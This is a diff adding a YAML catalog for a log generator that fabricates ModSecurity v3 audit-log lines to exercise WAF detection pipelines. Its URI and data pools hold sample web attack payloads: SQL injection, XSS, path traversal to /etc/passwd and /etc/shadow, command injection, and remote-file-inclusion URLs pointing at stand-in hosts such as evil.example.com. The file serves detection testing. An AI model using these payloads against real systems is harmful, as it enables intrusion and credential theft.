@@ -1,0 +1,472 @@
+vendor: owasp
+product: modsecurity-crs
+version: "4.x"
+log_type: audit-json
+description: |
+  ModSecurity v3 (libmodsecurity) JSON audit log — one transaction per line,
+  wire-format **audited 2026-05-15** against the upstream `Transaction::toJSON`
+  source at github.com/owasp-modsecurity/ModSecurity src/transaction.cc#L1567.
+
+  對齊 OWASP CRS 4.x rule fire 樣本,權重取自一份具代表性的多日期間
+  audit log 流量分佈(representative distribution,非單一真實部署的逐筆重放)。
+
+  三模式(--param mode=X):
+    realistic (default) — 權重對齊 production 分佈;打 100 條長相像真實流量
+    coverage            — 60 attack + 2 anomaly 均勻分佈;`--count 200+` 確保每條 ruleId 都至少 1 hit
+    single              — `--param rule_id=NNNNNN` 鎖定一條 ruleId 反覆灌
+
+  Sink:預設走 udp://192.0.2.18:514 餵 .18 ELK auto-route → modsec-audit-to-ecs ingest pipeline。
+  也可直接 file:///path 收檔給 .202 filebeat sidecar tail 重放。
+
+  Wire format key 順序(authoritative,from C++ source):
+    transaction.{client_ip, time_stamp, server_id, client_port, host_ip,
+                 host_port, unique_id, is_interrupted, request, response,
+                 producer, messages}
+    request.{method, http_version, hostname, uri, body?, headers}
+    response.{body?, http_code, headers}
+    producer.{modsecurity, connector, secrules_engine, components}
+    messages[].{message, details.{match, reference, ruleId, file,
+                lineNumber, data, severity, ver, rev, tags, maturity, accuracy}}
+
+  ⚠️ v3 與 v2 (Apache mod_security2) JSON 格式 NOT 互通 — v2 用 `audit_data` 包裝
+  且 messages 是 array of strings。此 catalog 是 v3 only。
+
+format: json
+transport: [udp_syslog, tcp_syslog, file, beats]
+
+ocsf:
+  class: web_resources_activity
+  category_uid: 6
+  class_uid: 6004
+
+# ──────────────── DetectOps v2 metadata ────────────────
+# ModSecurity audit log is the WAF's own detection stream — every line carries
+# a CRS rule_id that already classified the event. Catalog stresses ELK ingest
+# pipeline (modsec-audit-to-ecs) and confirms downstream Sigma/Kibana rules
+# correlate WAF blocks with origin events. TBD: pending live-fire verification.
+detections:
+  wazuh:
+    - decoder: modsecurity-nginx  # Wazuh modsec decoder family
+      # rule_id varies by CRS PARANOIA level + attack class; each CRS rule
+      # (e.g. 942100 SQLi) maps to its own Wazuh rule. Catalog mode=coverage
+      # exercises all of them; mode=single targets one.
+  sigma:
+    - rule: web_modsec_attack_blocked
+      ref: https://github.com/SigmaHQ/sigma/tree/master/rules/web
+  elk_detection:
+    - kibana_rule_id: waf-modsec-block-spike
+      severity: medium
+
+mythos_alignment:
+  # R1 — WAF is the front-line; AI-generated exploits hit here first.
+  # R4 — WAF block velocity is part of detection-velocity story.
+  # PA9 — WAF logs are the deception baseline (real vs honeypot traffic).
+  risk_refs: [R1, R4]
+  pa_refs: [PA9]
+  ttx_class: rapid
+
+regression:
+  # mode=coverage with --count 200 → ~200 alerts (every CRS hit fires Wazuh).
+  # mode=realistic with --count 100 → ~100 alerts (production attack ratio).
+  # Adjust per mode after first live-fire run.
+  baseline_alert_count: 100
+  baseline_ttd_ms: 3000
+
+# ──────────────── v3: CTI provenance ────────────────
+cti:
+  source: owasp-modsecurity-source-code
+  source_url: https://github.com/owasp-modsecurity/ModSecurity/blob/v3/master/src/transaction.cc#L1567
+  advisory_id: ""
+  ingested_at: "2026-05-15"
+  related_campaign: ""
+
+# ──────────────── v3: VulnOps reverse-lookup ────────────────
+# ModSecurity itself is not a CVE-driven catalog — it's the detection plane.
+# But upstream libmodsecurity / CRS upgrades can invalidate audit log shape,
+# so flag the regression-critical bit so a libmodsecurity upgrade kicks P0.
+vulnops:
+  cve_refs: []
+  affects:
+    - vendor: owasp
+      product: libmodsecurity
+      version_range: ">=3.0.0,<4.0.0"
+    - vendor: owasp
+      product: coreruleset
+      version_range: ">=4.0.0,<5.0.0"
+  patch_signal:
+    - libmodsecurity 3.x → 4.x bump
+    - CRS major version bump (4.x → 5.x)
+  regression_critical: true
+
+params:
+  # ─── mode switch ───
+  mode:
+    default: realistic        # realistic | coverage | single
+  rule_id:
+    default: "942100"         # 只在 single mode 用
+
+  # ─── runtime version pins (representative of a real production deployment) ───
+  modsecurity_version:
+    default: "ModSecurity v3.0.14 (Linux)"
+  connector_version:
+    default: "ModSecurity-nginx v1.0.4"
+  crs_version:
+    default: "OWASP_CRS/4.25.0"   # representative production 版本;升 4.26 時改這欄
+  secrules_engine:
+    default: "DetectionOnly"      # Enabled | DetectionOnly | Disabled
+
+  # ─── network pools ───
+  src_cidr:
+    default: "203.0.113.0/24"
+  dst_ip:
+    default: "192.0.2.202"
+  dst_port:
+    default: 443
+
+  # ─── ruleId pool: realistic (production-weighted, representative distribution) ───
+  rule_pool_realistic:
+    default:
+      "920350": 2051   # Host header is IP (top scanner signal)
+      "930130": 1831   # LFI restricted file
+      "920440": 374    # restricted extension
+      "934100": 228    # Node.js Injection
+      "934130": 169    # JS Prototype Pollution
+      "911100": 84     # Method not allowed
+      "942550": 69     # SQL JSON Injection
+      "920500": 42     # backup file access
+      "920270": 30     # invalid character (null)
+      "922110": 30     # MIME multipart illegal header
+      "932260": 27     # Unix command direct variant
+      "932235": 27     # Unix command no evasion
+      "933135": 19     # PHP variable access
+      "932130": 19     # Unix shell expression
+      "933160": 16     # PHP high-risk function
+      "932250": 15     # Unix command direct
+      "932230": 15     # Unix command short
+      "941390": 14     # XSS JS method
+      "942151": 12     # SQL function name
+      "932140": 12     # Windows FOR/IF command
+      "913100": 7      # scanner UA
+      "942100": 6      # SQLi libinjection
+      "930110": 5      # path traversal encoded
+      "930100": 5      # path traversal
+      "933210": 4      # PHP variable function call
+      "920170": 3      # GET with body
+      "920420": 3      # ContentType not allowed
+      "930120": 3      # OS file access
+      "933140": 2      # PHP I/O stream
+      "932380": 2      # Windows command direct
+      "933120": 2      # PHP config directive
+      "920540": 2      # Unicode bypass
+      "920280": 2      # missing host header
+      "920640": 1      # missing ContentType empty body
+      "920340": 1      # missing ContentType with body
+      "941160": 1      # XSS NoScript
+      "941110": 1      # XSS script tag
+      "941100": 1      # XSS libinjection
+
+  # ─── ruleId pool: coverage (60 attack + 2 anomaly,均勻 1) ───
+  rule_pool_coverage:
+    default:
+      "911100": 1
+      "913100": 1
+      "920100": 1
+      "920170": 1
+      "920180": 1
+      "920270": 1
+      "920280": 1
+      "920340": 1
+      "920350": 1
+      "920420": 1
+      "920440": 1
+      "920500": 1
+      "920540": 1
+      "920640": 1
+      "922110": 1
+      "930100": 1
+      "930110": 1
+      "930120": 1
+      "930130": 1
+      "931100": 1
+      "931110": 1
+      "931120": 1
+      "932100": 1
+      "932105": 1
+      "932115": 1
+      "932130": 1
+      "932140": 1
+      "932150": 1
+      "932230": 1
+      "932235": 1
+      "932250": 1
+      "932260": 1
+      "932380": 1
+      "933120": 1
+      "933135": 1
+      "933140": 1
+      "933160": 1
+      "933210": 1
+      "934100": 1
+      "934130": 1
+      "941100": 1
+      "941110": 1
+      "941130": 1
+      "941140": 1
+      "941160": 1
+      "941170": 1
+      "941180": 1
+      "941390": 1
+      "942100": 1
+      "942110": 1
+      "942130": 1
+      "942140": 1
+      "942151": 1
+      "942180": 1
+      "942260": 1
+      "942270": 1
+      "942280": 1
+      "942290": 1
+      "942350": 1
+      "942550": 1
+      "949110": 1
+      "980130": 1
+
+  # ─── ruleId metadata: msg + sev + family + line + CRS conf file prefix ───
+  # severity 對齊 libmodsecurity emitted numeric string:
+  #   CRITICAL=2 (大宗 attack 規則) / NOTICE=5 / 0=anomaly evaluation (空 severity)
+  rule_meta:
+    default:
+      "911100": { msg: "Method is not allowed by policy",                                               sev: 2, family: generic,   line: "85"  }
+      "913100": { msg: "Found User-Agent associated with security scanner",                             sev: 2, family: scanner,   line: "70"  }
+      "920100": { msg: "Invalid HTTP Request Line",                                                     sev: 4, family: protocol,  line: "88"  }
+      "920170": { msg: "GET or HEAD Request with Body Content",                                         sev: 2, family: protocol,  line: "139" }
+      "920180": { msg: "POST request missing Content-Length Header",                                    sev: 4, family: protocol,  line: "159" }
+      "920270": { msg: "Invalid character in request (null character)",                                 sev: 2, family: protocol,  line: "276" }
+      "920280": { msg: "Request Missing a Host Header",                                                 sev: 2, family: protocol,  line: "299" }
+      "920340": { msg: "Content-Type header missing from request with non-zero Content-Length",         sev: 2, family: protocol,  line: "381" }
+      "920350": { msg: "Host header is a numeric IP address",                                           sev: 2, family: protocol,  line: "395" }
+      "920420": { msg: "Request content type is not allowed by policy",                                 sev: 2, family: protocol,  line: "509" }
+      "920440": { msg: "URL file extension is restricted by policy",                                    sev: 2, family: protocol,  line: "555" }
+      "920500": { msg: "Attempt to access a backup or working file",                                    sev: 2, family: protocol,  line: "623" }
+      "920540": { msg: "Possible Unicode character bypass detected",                                    sev: 2, family: protocol,  line: "676" }
+      "920640": { msg: "Content-Type header missing from request with body",                            sev: 2, family: protocol,  line: "823" }
+      "922110": { msg: "Illegal MIME Multipart Header content-type: charset parameter",                 sev: 2, family: multipart, line: "65"  }
+      "930100": { msg: "Path Traversal Attack (/../) or (/.../)",                                       sev: 2, family: lfi,       line: "65"  }
+      "930110": { msg: "Path Traversal Attack (/../) or (/.../)",                                       sev: 2, family: lfi,       line: "92"  }
+      "930120": { msg: "OS File Access Attempt",                                                        sev: 2, family: lfi,       line: "131" }
+      "930130": { msg: "Restricted File Access Attempt",                                                sev: 2, family: lfi,       line: "172" }
+      "931100": { msg: "Possible Remote File Inclusion (RFI) Attack: URL Parameter using IP Address",   sev: 2, family: rfi,       line: "65"  }
+      "931110": { msg: "Possible Remote File Inclusion (RFI) Attack: Common RFI Vulnerable Parameter",  sev: 2, family: rfi,       line: "98"  }
+      "931120": { msg: "Possible Remote File Inclusion (RFI) Attack: URL Payload Used w/Trailing ?",    sev: 2, family: rfi,       line: "127" }
+      "932100": { msg: "Remote Command Execution: Unix Command Injection",                              sev: 2, family: rce,       line: "98"  }
+      "932105": { msg: "Remote Command Execution: Unix Command Injection",                              sev: 2, family: rce,       line: "133" }
+      "932115": { msg: "Remote Command Execution: Windows Command Injection",                           sev: 2, family: rce,       line: "189" }
+      "932130": { msg: "Remote Command Execution: Unix Shell Expression Found",                         sev: 2, family: rce,       line: "234" }
+      "932140": { msg: "Remote Command Execution: Windows FOR/IF Command Found",                        sev: 2, family: rce,       line: "267" }
+      "932150": { msg: "Remote Command Execution: Direct Unix Command Execution",                       sev: 2, family: rce,       line: "299" }
+      "932230": { msg: "Remote Command Execution: Unix Command Injection (2-3 chars)",                  sev: 2, family: rce,       line: "401" }
+      "932235": { msg: "Remote Command Execution: Unix Command Injection (command without evasion)",    sev: 2, family: rce,       line: "433" }
+      "932250": { msg: "Remote Command Execution: Direct Unix Command Execution",                       sev: 2, family: rce,       line: "465" }
+      "932260": { msg: "Remote Command Execution: Direct Unix Command Execution",                       sev: 2, family: rce,       line: "497" }
+      "932380": { msg: "Remote Command Execution: Windows Command Injection",                           sev: 2, family: rce,       line: "599" }
+      "933120": { msg: "PHP Injection Attack: Configuration Directive Found",                           sev: 2, family: php,       line: "98"  }
+      "933135": { msg: "PHP Injection Attack: Variable Access Found",                                   sev: 2, family: php,       line: "169" }
+      "933140": { msg: "PHP Injection Attack: I/O Stream Found",                                        sev: 2, family: php,       line: "201" }
+      "933160": { msg: "PHP Injection Attack: High-Risk PHP Function Call Found",                       sev: 2, family: php,       line: "265" }
+      "933210": { msg: "PHP Injection Attack: Variable Function Call Found",                            sev: 2, family: php,       line: "365" }
+      "934100": { msg: "Node.js Injection Attack 1/2",                                                  sev: 2, family: nodejs,    line: "65"  }
+      "934130": { msg: "JavaScript Prototype Pollution",                                                sev: 2, family: nodejs,    line: "147" }
+      "941100": { msg: "XSS Attack Detected via libinjection",                                          sev: 2, family: xss,       line: "65"  }
+      "941110": { msg: "XSS Filter - Category 1: Script Tag Vector",                                    sev: 2, family: xss,       line: "98"  }
+      "941130": { msg: "XSS Filter - Category 3: Attribute Vector",                                     sev: 2, family: xss,       line: "166" }
+      "941140": { msg: "XSS Filter - Category 4: JavaScript URI Vector",                                sev: 2, family: xss,       line: "199" }
+      "941160": { msg: "NoScript XSS InjectionChecker: HTML Injection",                                 sev: 2, family: xss,       line: "265" }
+      "941170": { msg: "NoScript XSS InjectionChecker: Attribute Injection",                            sev: 2, family: xss,       line: "299" }
+      "941180": { msg: "Node-Validator Blacklist Keywords",                                             sev: 2, family: xss,       line: "331" }
+      "941390": { msg: "Javascript method detected",                                                    sev: 2, family: xss,       line: "770" }
+      "942100": { msg: "SQL Injection Attack Detected via libinjection",                                sev: 2, family: sqli,      line: "46"  }
+      "942110": { msg: "SQL Injection Attack: Common Injection Testing Detected",                       sev: 2, family: sqli,      line: "133" }
+      "942130": { msg: "SQL Injection Attack: SQL Tautology Detected",                                  sev: 2, family: sqli,      line: "265" }
+      "942140": { msg: "SQL Injection Attack: Common DB Names Detected",                                sev: 2, family: sqli,      line: "299" }
+      "942151": { msg: "SQL Injection Attack: SQL function name detected",                              sev: 2, family: sqli,      line: "365" }
+      "942180": { msg: "Detects basic SQL authentication bypass attempts 1/3",                          sev: 2, family: sqli,      line: "433" }
+      "942260": { msg: "Detects basic SQL authentication bypass attempts 2/3",                          sev: 2, family: sqli,      line: "599" }
+      "942270": { msg: "Looking for basic sql injection. Common attack string for mysql, oracle and others", sev: 2, family: sqli, line: "633" }
+      "942280": { msg: "Detects Postgres pg_sleep injection, waitfor delay attacks and database shutdown attempts", sev: 2, family: sqli, line: "667" }
+      "942290": { msg: "Finds basic MongoDB SQL injection attempts",                                    sev: 2, family: sqli,      line: "701" }
+      "942350": { msg: "Detects MySQL UDF injection and other data/structure manipulation attempts",    sev: 2, family: sqli,      line: "933" }
+      "942550": { msg: "JSON-Based SQL Injection",                                                      sev: 2, family: sqli,      line: "1399"}
+      "949110": { msg: "Inbound Anomaly Score Exceeded",                                                sev: 0, family: anomaly,   line: "222" }
+      "980130": { msg: "Inbound Anomaly Score Exceeded (Total Inbound Score)",                          sev: 0, family: anomaly,   line: "100" }
+
+  # ─── CRS conf file 路徑(以 ruleId 前 3 碼為 key)───
+  family_file:
+    default:
+      "911": "REQUEST-911-METHOD-ENFORCEMENT.conf"
+      "913": "REQUEST-913-SCANNER-DETECTION.conf"
+      "920": "REQUEST-920-PROTOCOL-ENFORCEMENT.conf"
+      "922": "REQUEST-922-MULTIPART-ATTACK.conf"
+      "930": "REQUEST-930-APPLICATION-ATTACK-LFI.conf"
+      "931": "REQUEST-931-APPLICATION-ATTACK-RFI.conf"
+      "932": "REQUEST-932-APPLICATION-ATTACK-RCE.conf"
+      "933": "REQUEST-933-APPLICATION-ATTACK-PHP.conf"
+      "934": "REQUEST-934-APPLICATION-ATTACK-GENERIC.conf"
+      "941": "REQUEST-941-APPLICATION-ATTACK-XSS.conf"
+      "942": "REQUEST-942-APPLICATION-ATTACK-SQLI.conf"
+      "949": "REQUEST-949-BLOCKING-EVALUATION.conf"
+      "980": "RESPONSE-980-CORRELATION.conf"
+
+  # ─── URI pool per family(已 URL-encoded payload)───
+  uri_pool:
+    default:
+      sqli:
+        - "/products?id=1%27%20OR%20%271%27=%271"
+        - "/login.php?user=admin%27--&pass=x"
+        - "/api/v1/orders?id=1%20UNION%20SELECT%20username,password%20FROM%20users--"
+        - "/search?q=%27%20OR%20%271%27=%271%20--"
+      xss:
+        - "/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
+        - "/comment?msg=%3Cimg%20src=x%20onerror=alert(1)%3E"
+        - "/page?title=%22%3E%3Cscript%3Eevil()%3C/script%3E"
+      lfi:
+        - "/?file=../../../../etc/passwd"
+        - "/?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+        - "/admin?config=/var/www/html/.env"
+        - "/download?path=/etc/shadow"
+      rfi:
+        - "/?include=http://evil.example.com/shell.txt?"
+        - "/?page=https://attacker.tld/cmd.php?"
+      rce:
+        - "/?cmd=cat%20/etc/passwd"
+        - "/api?host=127.0.0.1;id"
+        - "/?q=%24(whoami)"
+        - "/cgi-bin/test?x=%60uname%20-a%60"
+      php:
+        - "/?lang=phpinfo();"
+        - "/?cfg=phar://malicious.zip"
+        - "/?call=system"
+      nodejs:
+        - "/?o=__proto__[admin]=true"
+        - "/?body=require('child_process').exec('id')"
+      generic:
+        - "/api/admin/users"
+        - "/wp-config.php.bak"
+      scanner:
+        - "/"
+        - "/wp-login.php"
+      protocol:
+        - "/"
+        - "/admin/.env"
+      multipart:
+        - "/upload"
+        - "/api/v1/files"
+      anomaly:
+        - "/"
+
+  # ─── data sample(audit log 內 details.data 欄位)───
+  data_pool:
+    default:
+      sqli:      ["1' OR '1'='1", "admin'--", "1 UNION SELECT * FROM users", "%27%20UNION%20SELECT"]
+      xss:       ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"]
+      lfi:       ["../../../../etc/passwd", "../../etc/shadow", "/var/www/.env"]
+      rfi:       ["http://evil.example.com/shell.txt", "https://attacker.tld/cmd.php"]
+      rce:       ["cat /etc/passwd", ";id", "$(whoami)", "`uname -a`"]
+      php:       ["phpinfo();", "system(", "phar://"]
+      nodejs:    ["__proto__[admin]=true", "require('child_process')"]
+      generic:   ["GET /admin", "config.bak"]
+      scanner:   ["sqlmap", "Nikto"]
+      protocol:  ["", "192.0.2.202"]
+      multipart: ["charset=utf-8;boundary=", "Content-Disposition: form-data"]
+      anomaly:   [""]
+
+  # ─── HTTP host header pool (一部分故意用 IP 觸發 920350) ───
+  host_pool:
+    default:
+      "app2.example.com": 0.20
+      "app1.example.com": 0.18
+      "elk.example.com": 0.04
+      "192.0.2.202": 0.30
+      "scanner.example.com": 0.10
+      "admin.local": 0.08
+      "test.example.com": 0.10
+
+  # ─── User-Agent pool ───
+  ua_pool:
+    default:
+      "curl/7.76.1":                                                                                 0.30
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36": 0.20
+      "sqlmap/1.7.12":                                                                               0.10
+      "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)":                      0.15
+      "python-requests/2.31.0":                                                                       0.10
+      "Go-http-client/1.1":                                                                           0.05
+      "Mozilla/5.00 (Nikto/2.5.0)":                                                                   0.05
+      "Wget/1.20.3 (linux-gnu)":                                                                      0.05
+
+fields:
+  # ─── network ───
+  - { name: client_ip,    type: cidr,      cidr: "${params.src_cidr}" }
+  - { name: client_port,  type: int_range, min: 30000, max: 65000 }
+  - { name: host_ip,      type: param,     param: dst_ip }
+  - { name: host_port,    type: param,     param: dst_port }
+
+  # ─── identifiers ───
+  # time_stamp uses C %c format (locale-aware "Www Mmm dd hh:mm:ss yyyy" e.g.
+  # "Fri May 15 12:34:56 2026") — matches libmodsecurity ascTime() output
+  - { name: time_stamp,   type: datetime,  format: "%a %b %e %H:%M:%S %Y" }
+  # server_id is yajl-internal uniqueId (utils::generate_transaction_unique_id);
+  # typically observed as sha1-style hex in real audit logs. hex_16 is a close approximation.
+  - { name: server_id,    type: faker,     method: sha1 }
+  - { name: unique_id,    type: faker,     method: hex_16 }
+
+  # ─── ruleId picker (mode-aware) ───
+  - { name: rule_id_realistic, type: weighted_choice, choices: "${params.rule_pool_realistic}" }
+  - { name: rule_id_coverage,  type: weighted_choice, choices: "${params.rule_pool_coverage}" }
+  - name: rule_id
+    type: template
+    template: "{% if params.mode == 'single' %}{{ params.rule_id }}{% elif params.mode == 'coverage' %}{{ rule_id_coverage }}{% else %}{{ rule_id_realistic }}{% endif %}"
+
+  # ─── http request ───
+  - { name: method, type: weighted_choice, choices: { GET: 0.65, POST: 0.25, PUT: 0.05, DELETE: 0.03, OPTIONS: 0.02 } }
+  # http_version is string in wire format ("1.1" or "2.0"), not numeric
+  - { name: http_version, type: weighted_choice, choices: { "1.1": 0.6, "2.0": 0.4 } }
+  - { name: host_header,  type: weighted_choice, choices: "${params.host_pool}" }
+  - { name: user_agent,   type: weighted_choice, choices: "${params.ua_pool}" }
+
+  # ─── attack picker (family-aware via ruleId) ───
+  - name: uri
+    type: template
+    template: "{{ params.uri_pool[params.rule_meta[rule_id].family] | random }}"
+  - name: data_excerpt
+    type: template
+    template: "{{ params.data_pool[params.rule_meta[rule_id].family] | random }}"
+
+  # ─── response ───
+  - { name: status, type: weighted_choice, choices: { "200": 0.85, "403": 0.10, "404": 0.05 } }
+
+  # ─── anomaly score (5-70 typical for ModSec CRS in DetectionOnly) ───
+  - { name: anomaly_score, type: int_range, min: 5, max: 70 }
+
+  # ─── messages array (single-line JSON,whitespace control suppresses \n) ───
+  # Tag set follows CRS 4.x rule definitions verbatim — most attack rules carry:
+  #   application-multi / language-multi / platform-multi / attack-<family> /
+  #   paranoia-level/1 / OWASP_CRS / capec/1000/152/248/66 / PCI/6.5.2
+  # Anomaly rules (949/980) carry: modsecurity / anomaly-evaluation / OWASP_CRS
+  - name: messages_json
+    type: template
+    template: |-
+      {%- set meta = params.rule_meta[rule_id] -%}
+      {%- set fam = meta.family -%}
+      {%- set conf_file = '/etc/modsecurity.d/owasp-crs/rules/' + params.family_file[rule_id[:3]] -%}
+      {%- if rule_id == '949110' -%}
+      [{"message":"Inbound Anomaly Score Exceeded (Total Score: {{ anomaly_score }})","details":{"match":"Matched \"Operator `Ge' with parameter `5' against variable `TX:BLOCKING_INBOUND_ANOMALY_SCORE' (Value: `{{ anomaly_score }}' )","reference":"","ruleId":"949110","file":"{{ conf_file }}","lineNumber":"{{ meta.line }}","data":"","severity":"0","ver":"{{ params.crs_version }}","rev":"","tags":["modsecurity","anomaly-evaluation","OWASP_CRS"],"maturity":"0","accuracy":"0"}}]
+      {%- elif rule_id == '980130' -%}
+      [{"message":"{{ meta.msg }}","details":{"match":"Anomaly Score: {{ anomaly_score }}","reference":"","ruleId":"980130","file":"{{ conf_file }}","lineNumber":"{{ meta.line }}","data":"","severity":"0","ver":"{{ params.crs_version }}","rev":"","tags":["modsecurity","anomaly-evaluation","OWASP_CRS"],"maturity":"0","accuracy":"0"}}]
+      {%- else -%}
+      [{"message":"{{ meta.msg }}","details":{"match":"Matched payload","reference":"v9,12","ruleId":"{{ rule_id }}","file":"{{ conf_file }}","lineNumber":"{{ meta.line }}","data":"Matched Data: {{ data_excerpt }}","severity":"{{ meta.sev }}","ver":"{{ params.crs_version }}","rev":"","tags":["application-multi","language-multi","platform-multi","attack-{{ fam }}","paranoia-level/1","OWASP_CRS","capec/1000/152/248/66","PCI/6.5.2"],"maturity":"0","accuracy":"0"}},{"message":"Inbound Anomaly Score Exceeded (Total Score: {{ anomaly_score }})","details":{"match":"Matched \"Operator `Ge' with parameter `5' against variable `TX:BLOCKING_INBOUND_ANOMALY_SCORE' (Value: `{{ anomaly_score }}' )","reference":"","ruleId":"949110","file":"/etc/modsecurity.d/owasp-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf","lineNumber":"222","data":"","severity":"0","ver":"{{ params.crs_version }}","rev":"","tags":["modsecurity","anomaly-evaluation","OWASP_CRS"],"maturity":"0","accuracy":"0"}}]
+      {%- endif -%}
+
+# Wire format (single-line JSON, key order matches libmodsecurity yajl output):
+#   transaction → request → response → producer → messages
+# http_version, http_code, client_port, host_port are NUMERIC types; everything else is string.
+# is_interrupted is BOOLEAN.
+template: '{"transaction":{"client_ip":"{{client_ip}}","time_stamp":"{{time_stamp}}","server_id":"{{server_id}}","client_port":{{client_port}},"host_ip":"{{host_ip}}","host_port":{{host_port}},"unique_id":"{{unique_id}}","is_interrupted":false,"request":{"method":"{{method}}","http_version":"{{http_version}}","hostname":"{{host_header}}","uri":"{{uri}}","headers":{"Host":"{{host_header}}","User-Agent":"{{user_agent}}","Accept":"*/*"}},"response":{"http_code":{{status}},"headers":{"Content-Type":"text/html","Server":"nginx/1.28.2"}},"producer":{"modsecurity":"{{params.modsecurity_version}}","connector":"{{params.connector_version}}","secrules_engine":"{{params.secrules_engine}}","components":["{{params.crs_version}}"]},"messages":{{messages_json}}}}'
